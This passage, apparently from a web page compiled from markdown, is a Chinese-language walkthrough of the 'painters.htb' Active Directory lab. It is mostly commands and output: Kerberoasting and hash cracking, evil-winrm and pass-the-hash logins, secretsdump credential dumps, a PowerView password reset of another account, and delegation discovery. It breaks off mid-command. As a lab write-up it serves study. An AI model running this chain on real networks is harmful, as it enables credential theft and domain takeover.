fe5bbfa920afbc883021d3143481371741db03ff6b5bb44d321b1ac695647fbc0587961e72999d0b8f226d6bd7d400c996e509f8128d339a59620495f61a827c48928a49529f815a2a7f649726b11215736013e10f35d43d426bd68afc3f8be74e1ea427e183989de23b11624ca22eaf2b0788d717c5d0e4442b6cf8a0adea08c82713790a98a3ed034111891b607618013010b1637b271372f1d0dbb440d558e47411fe783fadbe6ab9b3bfeac416fa4da6ef4de21f8fbfeaa43261c31fc5b225d1e47e075af75134e403ee23add14030e71fe2f852b357c30745842bf2f0f6dbc5bcf3a4a90bc3bdb6b72265325cf253350d1e90a26560ce4a8bb525c6c7bafc3b705235265a53283ea3dc4fceca7b9d498e9eaccdf819d240a6962919eedf295fadcc6caf60db97a8ba87dfc0251f8ebd26f3e54bf84fd08e50002cff846ba0886ff83db594e89cd3056b106fa75a63a26d25ff0449528760bd89a05f73c15f18856fec569eee93d84f6972d6b23ff68e20f14ed62061366ab9182066448dc785efb84119300d3bb14ced8a78bc75f705911386682d4e4c36f89ba3127e498009ae081d30ffae1a7ba340f73cf537e92801ff0a0ab28486618e057d3445f0e212ea6313e3f20baddbdcf17fd218f6edfed21aab4436d882cabbb7cc8d11f8ad330b87c22cd782bb2cd2d66d82b3569f5708af213a1295138c67edcf0\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7206\u7834hash(\u6ca1\u6709\u7206\u7834\u51fa\u6765)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"john aaa --wordlist=/usr/share/wordlists/rockyou.txt            \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 16 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:04 DONE (2024-06-14 08:39) 0g/s 3138Kp/s 3138Kc/s 3138KC/s !SkicA!..*7\xa1Vamos!\nSession completed.\n"})}),"\n",(0,s.jsx)(n.h5,{id:"web_svc\u7684hash",children:"web_svc\u7684hash"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/\u2026/Desktop/github/impacket/examples]\n\u2514\u2500# proxychains python  GetUserSPNs.py -dc-ip 192.168.110.55 -target-domain painters.htb painters.htb/riley:P@ssw0rd -request-user web_svc\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0.dev1+20240507.102706.4e3e668a - Copyright 2023 Fortra\n\n[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:389  ...  OK\nServicePrincipalName   Name     MemberOf  PasswordLastSet             LastLogon                   Delegation \n---------------------  -------  --------  --------------------------  --------------------------  ----------\nHTTP/svc.painters.htb  web_svc            2023-05-24 14:50:47.043365  2024-06-13 21:19:51.683396             \n\n\n\n[-] CCache file is not found. Skipping...\n[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:61000  ...  192.168.110.55:88  ...  OK\n$krb5tgs$23$*web_svc$PAINTERS.HTB$painters.htb/web_svc*$c2f373a33794a9fc942b8c09591ab3b8$f0c395583f8a92d54748ca057028e787f2fe8fc64a09a58d6f68c8de849f2c5165dca6eba7cbea7527eb4d5d2987bf9494d7dd1369c29eaa6b74540aba399e3f503fabfb247cf3ba222eff1237a0fe6593e8ad67004dae99653a75887183797148cb3e5ac5c39ed74360a0bbd87a35c294658328022dfb3ed60727df9f10554065facd81481ed9630c492a78b115eef9c8d87bf752a1f6a9417d5b60d01bfd920906106b833393d7ae39d8966e48303920d158cbcb3044e1ffa4478985b455370bd57b379b1e9f67a3c7d91d1763ea17247b8767dc4c7f1ae0a61b0b70d47dfc98ec39034d03afde2982dc89d168ccfb197137d7e6558203bc64f5096c38d93fb8f1df4908b9df50fb1784527b6dbb3a1c5ec6826ff21f33cbb3867f77ec034852851732ae848c056e5821eaea71065e41915d9a4b1f90fa0f71aae45b0327c8dbf23a555ac36da5fb1ed87d0ff6fd65cccc5cb5197056ad1cbbdc98f62301f7c640bae28db5fd7868beca724569b945fdce935eeb4a07a5c171bc6a045811b453ecfbc5dd344c2f8611c957f04e7ada34a075e9bf9e9615f1874af50985c96391c986c7d794f5a22d97cac8826f3b7c2bc5b035474d621ce7deb652da921ef78c31d7d2978c33fa72d17469e65edbf297a95c0b26abb1b4aa1badc7f4f111834ff550e9f6d518907eda98aa96c7ec99799e8804ffbfb29b99564e6fe368112e6d53a39dc5614c365f54ccf290d2be3f285005c28b7df374f2c8e521311c718a288a4f68befabdcfded8455bd70f4490b2bb9a72edf08f75e62d526fdda72fd9919382efcc8cc7c5a27a612c5d3f5e674ad690911794897b9d56c346ab7eea9352456c58a68d13871c28034ddabc666a49ce1c2db186ae4cc2badda5a1670c0ddf7a20371f2c45587310ee2eb7166816c429bb3b4cbfefa9e8f2e2200a256813c06ad7dac957de1102189a97f49f5e518bf6bcc32b945eec5d75ac747d85778a38ea257c4dd420a5c9322ef84dbb3cc15d5c405ef9dc4d64b5efd43eadab9b681792ec8a0e38a8c54a0a2a876b21e899ff8a6948bbd3946a194b50f83c32f159b5fdd98d8b40304563d867849471656b47b10d0a512016ca0b5616b9bc9ef90bbadaad42f2f3a1c032a340492dd961c0673e885e79828ba6ac489988b562d2ede6ffef978c07b23d76b91c8fe492c388281a594b753699cfe2ba0a4eff274e5b93a6a743f50bc8864cb8c0d1e613ba4b946402a294e848d5e122f52f61c9c72a70e2efbc2a8ae75e9746017cef8e5dc771b20e4042e8d11f3c2387e4c9f024aa18f33108ca6b89c5570d50a3804ecce02f6e249d226e6c8985c009ca60a48fc12af417b2ed23ef5b6591a154cc01f2d632fa3795bfe0322d6071ee2df71bad48a147818f7b7afabd9c580a56b03e43b290965be635fec7fe9002daa94c094ee23a5111823fefb53765bf\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7206\u7834hash"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/\u2026/Desktop/github/impacket/examples]\n\u2514\u2500# john bbb --wordlist=/usr/share/wordlists/rockyou.txt \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 16 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n!QAZ1qaz         (?)     \n1g 0:00:00:00 DONE (2024-06-09 23:11) 7.692g/s 315076p/s 315076c/s 315076C/s holabebe..loserface1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n"})}),"\n",(0,s.jsx)(n.h2,{id:"19216811052nmapweb_svc",children:"192.168.110.52(nmap\\web_svc)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'riley@mail:~$ ./nmap -Pn -T4 -sT --min-rate="1000" -p-  192.168.110.52\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-05 06:46 UTC\nUnable to find nmap-services!  Resorting to /etc/services\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for 192.168.110.52\nHost is up (0.0047s latency).\nNot shown: 65531 filtered ports\nPORT     STATE SERVICE\n135/tcp  open  epmap\n139/tcp  open  netbios-ssn\n445/tcp  open  microsoft-ds\n5985/tcp open  unknown\n'})}),"\n",(0,s.jsx)(n.h3,{id:"\u5bc6\u7801\u767b\u9646",children:"\u5bc6\u7801\u767b\u9646"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# proxychains evil-winrm -u web_svc -p '!QAZ1qaz'  -i 192.168.110.52\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n                                        \nEvil-WinRM shell v3.5\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n[proxychains] Strict chain  ...  192.248.165.125:61001  ...  192.168.110.52:5985  ...  OK\n*Evil-WinRM* PS C:\\Users\\web_svc\\Documents>\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u62d6hash\u503c",children:"\u62d6hash\u503c"}),"\n",(0,s.jsx)(n.h4,{id:"\u8fdc\u7a0b\u62d6445\u5f00\u653e",children:"\u8fdc\u7a0b\u62d6(445\u5f00\u653e)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/\u2026/Desktop/github/impacket/examples]\n\u2514\u2500# proxychains python secretsdump.py  painters.htb/web_svc:'!QAZ1qaz'@192.168.110.52\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0.dev1+20240507.102706.4e3e668a - Copyright 2023 Fortra\n\n[proxychains] Strict chain  ...  192.248.165.125:61001  ...  192.168.110.52:445  ...  OK\n[*] Service RemoteRegistry is in stopped state\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0xb131ea5c8206a94e3d32119d035961a9\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nJames:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::\n[*] Dumping cached domain logon information (domain/username:hash)\nPAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2023-12-15 06:13:08)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \nPAINTERS\\PNT-SVRSVC$:aes256-cts-hmac-sha1-96:a31b4a0de42a441e47dad46f283105a9eeaf023831336cf2b2933c2907a63c4a\nPAINTERS\\PNT-SVRSVC$:aes128-cts-hmac-sha1-96:0f5239792536fef683f21de1925b8ca4\nPAINTERS\\PNT-SVRSVC$:des-cbc-md5:9e89f79eb37f1fcb\nPAINTERS\\PNT-SVRSVC$:plain_password_hex:9c2295062db39652dd63b214344ce839af0ab487e64efc62923556fd6515e24f383f0f9a34006bae1f108446483b2e8c54a2d0bd08388b0e47dc12ad75a1859c45c917072bb683477e379108ff3131bcb52a4d4a2046c6c6f6252945e4b4e3c465a33a379854b4771e7cec30db10df8990bb0867c826c50d8d0646d4f817d70becbf98058e81d6a5b0f606263ea3c6495ff553bef55ee6fe109d03e5237ad0061f9ed7f0694d5c9be2a87379b82491871df259d251ff8a114d76961009551f53a5abaa1d51d7aa1d06d6e730a1a14797d33f71c3690eea3a00a09711f2053872d9dc815e3de06808e6b681c737cc9e33\nPAINTERS\\PNT-SVRSVC$:aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5:::\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0x6a28296d276ce0627958e99cfbcab0b54ff64355\ndpapi_userkey:0xaf502a3258e233f29ce3ca24257f5877965bb87d\n[*] NL$KM \n 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W\n 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..\n 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%\n 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.\nNL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7\n[*] Cleaning up... \n[*] Stopping service RemoteRegistry\n"})}),"\n",(0,s.jsx)(n.h4,{id:"\u672c\u5730\u62d6",children:"\u672c\u5730\u62d6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"*Evil-WinRM* PS C:\\Users\\web_svc\\Documents> reg save hklm\\sam C:\\sam.save \nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\web_svc\\Documents> reg save hklm\\security C:\\security.save \nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\web_svc\\Documents> reg save hklm\\system C:\\system.save\nThe operation completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\web_svc\\Documents> cd ../../../\n*Evil-WinRM* PS C:\\> ls\n\n\n    Directory: C:\\\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          5/8/2021   9:15 AM                PerfLogs\nd-r---         2/15/2023  11:08 AM                Program Files\nd-----          3/8/2022   1:53 PM                Program Files (x86)\nd-r---         6/14/2024  10:34 AM                Users\nd-----         12/6/2023   3:50 AM                Windows\n-a----         6/14/2024  10:35 AM          61440 sam.save\n-a----         6/14/2024  10:35 AM          40960 security.save\n-a----         6/14/2024  10:35 AM       13447168 system.save\n\n\n*Evil-WinRM* PS C:\\> download sam.save\n[proxychains] Strict chain  ...  192.248.165.125:61002  ...  192.168.110.52:5985  ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:61002  ...  192.168.110.52:5985  ...  OK\n                                        \nInfo: Downloading C:\\\\sam.save to sam.save\n                                        \nInfo: Download successful!\n*Evil-WinRM* PS C:\\> download security.save\n                                        \nInfo: Downloading C:\\\\security.save to security.save\n                                        \nInfo: Download successful!\n*Evil-WinRM* PS C:\\> download system.save\n                                        \nInfo: Downloading C:\\\\system.save to system.save\n                                        \nInfo: Download successful!\n*Evil-WinRM* PS C:\\> \n                                        \nWarning: Press \"y\" to exit, press any other key to continue\n                                        \nInfo: Exiting...\n                                                                                                                   \n\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# secretsdump.py -sam sam.save -system system.save -security security.save LOCAL\n/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'secretsdump.py')\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[*] Target system bootKey: 0xb131ea5c8206a94e3d32119d035961a9\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nJames:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::\n[*] Dumping cached domain logon information (domain/username:hash)\nPAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2023-12-15 06:13:08)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \n$MACHINE.ACC:plain_password_hex:9c2295062db39652dd63b214344ce839af0ab487e64efc62923556fd6515e24f383f0f9a34006bae1f108446483b2e8c54a2d0bd08388b0e47dc12ad75a1859c45c917072bb683477e379108ff3131bcb52a4d4a2046c6c6f6252945e4b4e3c465a33a379854b4771e7cec30db10df8990bb0867c826c50d8d0646d4f817d70becbf98058e81d6a5b0f606263ea3c6495ff553bef55ee6fe109d03e5237ad0061f9ed7f0694d5c9be2a87379b82491871df259d251ff8a114d76961009551f53a5abaa1d51d7aa1d06d6e730a1a14797d33f71c3690eea3a00a09711f2053872d9dc815e3de06808e6b681c737cc9e33\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0x6a28296d276ce0627958e99cfbcab0b54ff64355\ndpapi_userkey:0xaf502a3258e233f29ce3ca24257f5877965bb87d\n[*] NL$KM \n 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W\n 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..\n 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%\n 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.\nNL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7\n[*] Cleaning up...\n"})}),"\n",(0,s.jsx)(n.h2,{id:"19216811053nmapjames",children:"192.168.110.53(nmap\\james)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python"})}),"\n",(0,s.jsx)(n.h3,{id:"pth\u767b\u9646",children:"PTH\u767b\u9646"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# proxychains evil-winrm -u james -H 8af1903d3c80d3552a84b6ba296db2ea  -i 192.168.110.53\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n                                        \nEvil-WinRM shell v3.5\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:5985  ...  OK\n*Evil-WinRM* PS C:\\Users\\James\\Documents>\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u5206\u6790bloodhound",children:"\u5206\u6790bloodhound"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"alt text",src:a(9476).A+"",width:"1218",height:"792"})}),"\n",(0,s.jsx)(n.h4,{id:"forcechangepassword",children:"ForceChangePassword"}),"\n",(0,s.jsx)(n.p,{children:"\u9996\u5148\u9700\u8981\u4f7f\u7528evil-winrm(\u65b9\u4fbf\u4e0a\u4f20\u6587\u4ef6)\u767b\u9646james\n\u4e0a\u4f20PowerView.ps1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"*Evil-WinRM* PS C:\\> upload /home/rookie/Desktop/PowerView.ps1\n                                        \nInfo: Uploading /home/rookie/Desktop/PowerView.ps1 to C:\\\\PowerView.ps1\n                                        \nData: 1027036 bytes of 1027036 bytes copied\n                                        \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\> \n"})}),"\n",(0,s.jsx)(n.admonition,{type:"tip",children:(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Import-Module .\\PowerView.ps1\n$UserPassword = ConvertTo-SecureString 'NewPassword123!@#$' -AsPlainText -Force\nSet-DomainUserPassword -Identity BLAKE -AccountPassword $UserPassword\n"})})}),"\n",(0,s.jsx)(n.p,{children:"\u8fd0\u7528powerview\u66f4\u6539BLAKE\u5bc6\u7801"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500# proxychains psexec.py james@192.168.110.53 -target-ip 192.168.110.53 -hashes aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n/usr/local/bin/psexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'psexec.py')\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:445  ...  OK\n[*] Requesting shares on 192.168.110.53.....\n[*] Found writable share ADMIN$\n[*] Uploading file eMBUMseW.exe\n[*] Opening SVCManager on 192.168.110.53.....\n[*] Creating service BhnS on 192.168.110.53.....\n[*] Starting service BhnS.....\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:445  ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:445 [!] Press help for extra shell commands\n ...  OK\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.53:445  ...  OK\nMicrosoft Windows [Version 10.0.20348.2113]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> cd C:/\n \nC:\\> Import-Module .\\PowerView.ps1\n'Import-Module' is not recognized as an internal or external command,\noperable program or batch file.\n\nC:\\> powershell\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nInstall the latest PowerShell for new features and improvements! https://aka.ms/PSWindows\n\nImport-Module .\\PowerView.ps1\nPS C:\\> Import-Module .\\PowerView.ps1\n$UserPassword = ConvertTo-SecureString 'NewPassword123!@#$' -AsPlainText -Force\nPS C:\\> $UserPassword = ConvertTo-SecureString 'NewPassword123!@#$' -AsPlainText -Force\nSet-DomainUserPassword -Identity BLAKE -AccountPassword $UserPassword\nPS C:\\> Set-DomainUserPassword -Identity BLAKE -AccountPassword $UserPassword\n"})}),"\n",(0,s.jsx)(n.h2,{id:"19216811054nmapblake",children:"192.168.110.54(nmap\\blake)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'riley@mail:~$ ./nmap -Pn -T4 -sT --min-rate="1000" -p-  192.168.110.54\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-04 08:49 UTC\nUnable to find nmap-services!  Resorting to /etc/services\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for 192.168.110.54\nHost is up (0.00091s latency).\nNot shown: 65534 filtered ports\nPORT     STATE SERVICE\n5985/tcp open  unknown\n'})}),"\n",(0,s.jsx)(n.h3,{id:"\u5bc6\u7801\u767b\u9646-1",children:"\u5bc6\u7801\u767b\u9646"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500#  proxychains evil-winrm -u BLAKE -p 'NewPassword123!@#$'  -i 192.168.110.54\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n                                        \nEvil-WinRM shell v3.5\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 \n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   \n                                        \nInfo: Establishing connection to remote endpoint\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.54:5985  ...  OK\n*Evil-WinRM* PS C:\\Users\\Blake\\Documents>\n"})}),"\n",(0,s.jsx)(n.h4,{id:"\u62d6\u53d6hash",children:"\u62d6\u53d6hash"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500#  secretsdump.py -sam sam.save -system system.save -security security.save LOCAL\n/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'secretsdump.py')\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[*] Target system bootKey: 0xe84cfc715ea5d48c94b35796175e802a\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:7ea794e50c1ac708c1db3aa025aeb5ea:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Dumping cached domain logon information (domain/username:hash)\nPAINTERS.HTB/blake:$DCC2$10240#blake#208c8e5baa521a823aff62fafef30cfc: (2023-02-27 13:07:57)\nPAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2023-12-15 06:12:40)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC \n$MACHINE.ACC:plain_password_hex:57979742bad762e01f40005c6919cdd6229188a6d6c0ee28791d778d29b054f7771cfca78db3482d6b15dfa2a57b43d23436019a0c25115e433b099a5f2c724b56b04f29a2f8b8993541d1f19b863884bee36c5be01c069d193e72621d9afe0ffcd4a17da90028a61cad9e0cb1a0699b6fd4e3596d3514dc136d3c82cb67c9afbb759e035e24925272c4f32a9affc6cdfde394a73e4c2ec683e2af6c4db364a11c8c5a09136490e7f94b93fb0e4c8a7b0a9db42f761435d0519ec3cfba69ef72d59c9d86d107efb06a1444ffc6bb1807b6c8727c3501f21b0698a50582a37dfcb707500e2ee1bb799e1d412707c035b2\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7fc6b6b4b44a96617b5829a888b5a85a\n[*] DPAPI_SYSTEM \ndpapi_machinekey:0xeea0ab26089b4c01128ff703571d5f50ef86f728\ndpapi_userkey:0x762a420566ee06d418442baba8d351d242b38442\n[*] NL$KM \n 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W\n 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..\n 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%\n 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.\nNL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7\n[*] Cleaning up...\n"})}),"\n",(0,s.jsx)(n.h4,{id:"\u53d1\u73b0\u59d4\u6d3e\u53d7\u534f\u8bae\u8f6c\u6362\u7ea6\u675f",children:"\u53d1\u73b0\u59d4\u6d3e(\u53d7\u534f\u8bae\u8f6c\u6362\u7ea6\u675f)"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/rookie/Desktop]\n\u2514\u2500#  proxychains findDelegation.py \"PAINTERS.HTB\"/\"BLAKE\":'NewPassword123!@#$' -dc-ip 192.168.110.55\n[proxychains] config file found: /etc/proxychains.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n/usr/local/bin/findDelegation.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  __import__('pkg_resources').run_script('impacket==0.12.0.dev1+20240606.111452.d71f4662', 'findDelegation.py')\nImpacket v0.12.0.dev1+20240606.111452.d71f4662 - Copyright 2023 Fortra\n\n[proxychains] Strict chain  ...  192.248.165.125:60001  ...  192.168.110.55:389  ...  OK\nAccountName  AccountType  DelegationType                      DelegationRightsTo    SPN Exists \n-----------  -----------  ----------------------------------  --------------------  ----------\nblake        Person       Constrained w/ Protocol Transition  CIFS/dc.painters.htb  Yes        \nblake        Person       Constrained w/ Protocol Transition  CIFS/DC               Yes        \ndaniel       Person       Constrained                         CIFS/dc.painters.htb  Yes        \ndaniel       Person       Constrained                         CIFS/DC               Yes\n"})}),"\n",(0,s.jsx)(n.h2,{id:"19216811055",children:"192.168.110.55"}),"\n",(0,s.jsx)(n.h3,{id:"getstpy",children:"GetST.py"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"\u250c\u2500\u2500(root\u327fRookie)-[/home/\u2026/Desktop/github/impacket/examples]\n\u2514\u2500# proxychains getST.py -dc-ip 